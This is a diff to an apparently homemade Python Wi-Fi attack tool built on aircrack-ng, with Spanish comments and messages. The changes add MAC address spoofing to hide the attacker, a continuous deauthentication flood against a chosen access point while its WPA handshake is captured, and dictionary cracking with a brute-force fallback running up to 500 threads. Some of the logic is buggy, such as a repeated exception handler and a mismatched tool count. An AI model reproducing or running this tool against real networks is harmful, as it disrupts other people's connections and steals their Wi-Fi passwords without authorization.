@@ -1,14 +1,16 @@
 #!/bin/python3
-import string
+
 
 try:
     print("\n[*] Starting...")
     print("\n\t[*] Comprobando librerias...")
+    import string
+    import re
     import colorama
     from colorama import Fore
     import os
     import time
-    import re
+    import random
     import subprocess
     import threading
     import multiprocessing
@@ -23,7 +25,9 @@ except ModuleNotFoundError as e:
     print("[!] Exiting...")
     exit(1)
 
-# Solicionar <lenght:
+# tener en cuenta nombres de interfaces diferentes para la funcion
+# Monitor mode
+
 
 def delete_files():
     os.system('find captures -type f ! -name "*.cap" -delete > /dev/null')
@@ -42,20 +46,26 @@ def stop_monitoring():
 
 def exiting(err):
     if err:
-        if err == "True":
+        if err == True:
             print(Fore.YELLOW + "\n[*] " + Fore.RED + "Exiting due a error...\n\n" + err)
 
         elif err == "done":
             print(Fore.YELLOW + "\n\n[*] " + Fore.RED + "Exiting tool...")
 
-    else:
+        elif err == False:
+            print(Fore.YELLOW + "\n\n[*] " + Fore.RED + "Exiting, Ctrl + C recived...")
+
+    elif not err:
         print(Fore.YELLOW + "\n\n[*] " + Fore.RED + "Exiting, Ctrl + C recived...")
 
     print(
         Fore.WHITE + "\n  ·  ·  ·  · " + Fore.YELLOW + "[*] " +
                         Fore.LIGHTCYAN_EX + "Restarting network services"
-        + Fore.YELLOW +Fore.WHITE + "\n  ·  ·  ·  · " + "[*] " +
-                        Fore.LIGHTCYAN_EX + "Stopping monitor mode..." + Fore.RESET)
+        + Fore.WHITE + "\n  ·  ·  ·  · " + Fore.YELLOW + "[*] " +
+                    Fore.LIGHTCYAN_EX + "Stopping monitor mode..." + Fore.RESET
+
+        + Fore.WHITE + "\n  ·  ·  ·  · " + Fore.YELLOW + "[*] " +
+                    Fore.LIGHTCYAN_EX + "Restoring mac address..." + Fore.RESET)
 
     try:
         stop_monitoring()
@@ -64,7 +74,7 @@ def exiting(err):
 
     print(Fore.WHITE + "  ·  ·  ·  · " + Fore.YELLOW + "[*] " + Fore.LIGHTCYAN_EX + "Deleting some files..."
           + Fore.RESET)
-
+    restore_mac()
     restart_net()
     delete_files()
 
@@ -77,6 +87,14 @@ def am_i_root():
     if os.getuid() != 0:
         print(Fore.RED + "\n[!] Necesitamos ser root...")
         exit(1)
+
+
+def change_mac():
+    os.system(f"sudo macchanger -r {choosed_interface} > /dev/null")
+
+
+def restore_mac():
+    os.system(f"sudo macchanger -p {choosed_interface} > /dev/null")
 
 
 def check_utilities():
@@ -105,10 +123,22 @@ def check_utilities():
         non_installed["airodump-ng"] = False
     else:
         non_installed["airodump-ng"] = True
+    if os.system("command -v macchanger > /dev/null") != 0:
+        non_installed["macchanger"] = False
+    else:
+        non_installed["macchanger"] = True
 
     for tool in non_installed:
         time.sleep(0.4)
-        if not non_installed[tool]:
+
+        if tool in ["aireplay-ng", "airodump-ng", "airmon-ng"]:
+            if not non_installed[tool]:
+                print(Fore.WHITE + "  ·  ·  ·  · " + Fore.YELLOW + "[!] " + Fore.LIGHTCYAN_EX +
+                      "La herramienta " + Fore.GREEN + "aircrack-ng" + Fore.LIGHTCYAN_EX +
+                      " no está instalada correctamente...")
+
+
+        elif not non_installed[tool]:
             print(Fore.WHITE + "  ·  ·  ·  · " + Fore.YELLOW + "[!] " + Fore.LIGHTCYAN_EX +
                   "La herramienta " + Fore.GREEN + f"{tool}" + Fore.LIGHTCYAN_EX + " no está instalada.")
 
@@ -117,7 +147,7 @@ def check_utilities():
                   "La herramienta " + Fore.GREEN + f"{tool}" + Fore.LIGHTCYAN_EX + " está instalada.")
             tools += 1
 
-    if tools != 4:
+    if tools != 2:
         print(Fore.RED + "\n[!] " + Fore.YELLOW +
               "Es necesario contrar con todas las herramientas para ejecutar el script...")
     else:
@@ -132,7 +162,17 @@ def kill_conects():
 
 def monitor_mode(choosed_interface):
     global interface
-    interface = re.findall("^[a-z]+[0-9]+mon", choosed_interface + "mon")[0]
+
+    try:
+        interface = re.findall("^[a-z]+[0-9]+mon", choosed_interface + "mon")[0]
+    except IndexError:
+        interface = re.findall("^([a-z]+[0-9]+[a-z]+[0-9]+mon)", choosed_interface + "mon")[0]
+    except IndexError:
+        exiting(err=True)
+
+
+    change_mac()
+
     os.system("airmon-ng start %s > /dev/null" % choosed_interface)
     os.system("iwconfig {} | grep -Eo 'Mode:([A-Z][a-z]+)' > espec/mode".format(interface))
 
@@ -208,6 +248,9 @@ def init_start_attack(choosed_interface):
               " no se ha establecido en modo monitor correctamente...")
         exiting(err=True)
         prepared = False
+
+    print(Fore.BLUE + "\n\t[" + Fore.RED + "V" + Fore.BLUE + "] " + Fore.YELLOW +
+          "Cambiando MAC address de " + Fore.LIGHTCYAN_EX + f"{choosed_interface}" + Fore.RESET)
 
     if prepared:
         print(Fore.YELLOW + "\n[*] " + Fore.BLUE + "Prepared to start capturing data...")
@@ -304,15 +347,11 @@ def print_process_data(dict, args):
         net += 1
         time.sleep(0.5)
 
-        print(Fore.YELLOW + f"\n\t{net}.[*] " + Fore.RED + "Name -> " + Fore.GREEN + "{}\n".format(network) +
-               "\n\t\t" + Fore.YELLOW + "[+] " + Fore.BLUE + "BSSID -> " + Fore.GREEN + "{}"
-               .format(dict[network]['bssid']) +
-
-               "\t\t" + Fore.YELLOW + "[+] " + Fore.BLUE + "Channel -> " + Fore.GREEN + "{}"
-               .format(dict[network]['channel']) +
-
-               "\t\t" + Fore.YELLOW + "[+] " + Fore.BLUE + "Encryption -> " + Fore.GREEN + "{}"
-               .format(dict[network]["encription_type"]))
+        print(Fore.YELLOW + f"\n\t{net}.[*] " + Fore.RED + "Name -> " + Fore.GREEN + "{}\n".format(network) + "\n\t\t" +
+              Fore.YELLOW + "[+] " + Fore.BLUE + "BSSID -> " + Fore.GREEN + "{}".format(dict[network]['bssid']) + "\t\t"
+              + Fore.YELLOW + "[+] " + Fore.BLUE + "Channel -> " + Fore.GREEN + "{}".format(dict[network]['channel']) +
+              "\t\t" + Fore.YELLOW + "[+] " + Fore.BLUE + "Encryption -> " + Fore.GREEN + "{}".format(
+            dict[network]["encription_type"]))
 
     network_to_attack = None
     while not network_to_attack:
@@ -332,13 +371,12 @@ def prepare_attack(dict, network_to_attack, args):
     file = None
 
     while not file:
-        file = input(Fore.YELLOW + "\n\t[" + Fore.RED + "S" + Fore.YELLOW + "] " + Fore.LIGHTCYAN_EX +
-                                                    "Enter the name of the file to save [E.j capture1] > ")
+        file = input(Fore.YELLOW + "\n\t[" + Fore.RED + "S" + Fore.YELLOW + "] " + 
+                     Fore.LIGHTCYAN_EX + "Enter the name of the file to save [E.j capture1] > ")
 
         if os.system("find captures/{}/{}* 2>/dev/null 1>/dev/null".format(network_to_attack, file)) == 0:
             print(Fore.RED + "\n\t\t[!] " + Fore.YELLOW + "Este nombre ya esta usado por algún archivo.")
             file = None
-
 
     # Definimos bssid y channel
     bssid = dict[network_to_attack]['bssid']
@@ -365,10 +403,12 @@ def prepare_attack(dict, network_to_attack, args):
 
 
 def capture_handshake(direc, args, bssid, ch, file, network_to_attack):
-    test = subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface], stdout=subprocess.DEVNULL)
 
     hand = subprocess.Popen(["airodump-ng", "-w", f"captures/{network_to_attack}/" + file, "-c", ch, "--bssid", bssid,
                              f"{interface}"], stdout=subprocess.PIPE)
+
+    subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface], stdout=subprocess.DEVNULL)
+
     done = False
     while True:
         try:
@@ -383,7 +423,7 @@ def capture_handshake(direc, args, bssid, ch, file, network_to_attack):
 
     print(Fore.LIGHTCYAN_EX + "\n\n\n\n\n\n\n\n\n\n\n\n[T] " + Fore.YELLOW + "Comprobando captura de hanshake")
     if done:
-        print(Fore.LIGHTYELLOW_EX + "\n\t[V] " + Fore.CYAN + "Handskake capturado...\n\n")
+        print(Fore.LIGHTYELLOW_EX + "\n\t[V] " + Fore.CYAN + "Handskake capturado...")
     else:
         print(Fore.RED + "\n\t[T] " + Fore.YELLOW + "Hanshake no capturado...")
         exiting(err=True)
@@ -416,7 +456,7 @@ def crack_handshake(direc, args, file):
         if args.threads:
             evilCracker.startbrute(file, args.brute, args.threads)
         else:
-            evilCracker.startbrute(file, args.brute, 200)
+            evilCracker.startbrute(file, args.brute, 500)
         exiting(err="done")
 
     print(Fore.YELLOW + "\n\t[!] " + Fore.LIGHTCYAN_EX + "Abriendo archivo '.cap'\n" + Fore.RESET)
@@ -430,25 +470,53 @@ def crack_handshake(direc, args, file):
     while True:
         try:
             output = crack.stdout.readline()
-            if not output:
-                break
             print(output.decode().strip())
+            if "KEY NOT FOUND".encode() in output:
+                found = False
+                break
+            elif "KEY FOUND".encode() in output:
+                found = True
+                break
         except KeyboardInterrupt:
             break
+
+    if not found:
+        os.system("clear")
+        print(Fore.RED + "\n\n[!] " + Fore.LIGHTYELLOW_EX + "La clave no se ha encontrado...")
+        print(Fore.LIGHTCYAN_EX + "\n\t[*] " + Fore.LIGHTYELLOW_EX + "Quieres probar un ataque de fuerza bruta? ")
+        s = input("\n\t\t[S/N] -> ")
+
+        if s.lower() == "s":
+            if args.threads:
+                evilCracker.startbrute(file, "r", args.threads)
+            else:
+                evilCracker.startbrute(file, "r", 200)
+        else:
+            exiting(err='done')
 
 
 def main():
     try:
         # Recogemos argumentos
         parser = argparse.ArgumentParser()
-        parser.add_argument("-w", "--wordlist", help="Set diccionary attack, specify an extern wordlists dictionary  USAGE:  -w /path/to/dict\n", required=False)
-        parser.add_argument("-b", "--brute", help="Use password generator for brute force   USAGE: -b [length passwords / r (random)] E.j: -b 12 ", required=False)
+        
+        # Argumento de diccionario
+        parser.add_argument("-w", "--wordlist", help="Set diccionary attack, specify an extern wordlists dictionary  "
+                                                     "USAGE:  -w /path/to/dict\n", required=False)
+        
+        # Argumento de fuerza bruta
+        parser.add_argument("-b", "--brute", help="Use password generator for brute force   USAGE: -b "
+                                                  "[length passwords / r (random)] E.j: -b 12 ", required=False)
+        
+        # Argumento de hilos
         parser.add_argument("-t", "--threads", help="Specify the number of threads", required=False)
+        
         args = parser.parse_args()
 
         # Checkeamos argumentos que estén bien...
         if not args.wordlist and not args.brute:
-            print(Fore.RED + "[!] ERROR: " + Fore.YELLOW + "Debes introducir un parámetro...\n\t [ --help / -h ] for help")
+            print(Fore.RED + "[!] ERROR: " + 
+                  Fore.YELLOW + "Debes introducir un parámetro...\n\t [ --help / -h ] for help")
             exit(1)
 
         elif args.brute:
@@ -458,26 +526,24 @@ def main():
                     try:
                         num = int(num)
                     except ValueError:
-                        print(Fore.RED + "[!] " + Fore.LIGHTYELLOW_EX + "Opción inválida..." \
-                                                    "\n\tIntroduce un NUMERO...")
+                        print(Fore.RED + "[!] " + Fore.LIGHTYELLOW_EX + "Opción inválida...\n\tIntroduce un NUMERO...")
                         exit(1)
 
                     if num > 501:
-                        print(Fore.RED + "[!] " + Fore.LIGHTYELLOW_EX + "Opción inválida..." \
-                                                    "\n\tIntroduce el numero de hilos a usar entre 20 a 500...")
+                        print(Fore.RED + "[!] " + Fore.LIGHTYELLOW_EX + "Opción inválida...\n\tIntroduce el numero "
+                                                                        "de hilos a usar entre 20 a 500...")
                         exit(1)
                     elif num < 20:
-                        print(Fore.RED + "[!] " + Fore.LIGHTYELLOW_EX + "Opción inválida..." \
-                                                                        "\n\tIntroduce el numero de hilos a usar entre 20 a 500...")
+                        print(Fore.RED + "[!] " + Fore.LIGHTYELLOW_EX + "Opción inválida...\n\tIntroduce el numero "
+                                                                        "de hilos a usar entre 20 a 500...")
                         exit(1)
 
             if args.brute != "r":
                 for num in args.brute:
                     if num not in string.digits:
-                        print(Fore.RED + "[!] " + Fore.LIGHTYELLOW_EX + "Opción inválida..." \
-                                "\n\tIntroduce el largo de las contraseñas o 'r' para random length")
+                        print(Fore.RED + "[!] " + Fore.LIGHTYELLOW_EX + "Opción inválida...\n\tIntroduce el largo de "
+                                                                        "las contraseñas o 'r' para random length")
                         exit(1)
-
 
         # Somos root?
         am_i_root()
@@ -498,9 +564,9 @@ def main():
     except KeyboardInterrupt:
         exiting(err=False)
 
-    """# Salida por error
+    # Salida por error
     except Exception as e:
-        exiting(err=e)"""
+        exiting(err=e)
 
 
 if __name__ == "__main__":
